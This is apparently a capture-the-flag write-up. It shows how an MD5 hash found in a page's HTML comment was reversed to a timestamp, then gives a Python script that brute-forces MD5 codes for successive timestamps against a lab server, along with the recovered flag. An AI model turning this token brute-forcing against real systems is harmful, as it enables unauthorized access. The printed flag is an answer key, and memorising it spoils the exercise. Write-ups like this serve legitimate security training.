opened the inspect element and saw:
<!-- Our first bug was: d63af914bd1b6210c358e145d61a8abc. Please fix now! -->

d63af914bd1b6210c358e145d61a8abc caught my attention and looked for encyption methods and found out that
md5 hash and it translated to 1628168161



wrote a bruteforce algorihm that basically goes from that first bug ticket a million tickets ahead until it finds the flag:

import requests, hashlib, re

url = "http://34.107.28.150:31060"
base_ts = 1628168161

for i in range(1000000):
    code = hashlib.md5(str(base_ts + i).encode()).hexdigest()
    r = requests.post(url, data={"code": code})
    m = re.search(r'ctf\{[0-9a-fA-F]{64}\}', r.text)
    if m:
        print(f"Timestamp: {base_ts + i}\nFlag: {m.group()}")
        break

ran this code and got:
Timestamp: 1628168340
Flag: ctf{4086d9012b250dc1d821340f23b4af9b29d780552434175cb713b6d7502885c9}

flag:
**ctf{4086d9012b250dc1d821340f23b4af9b29d780552434175cb713b6d7502885c9}**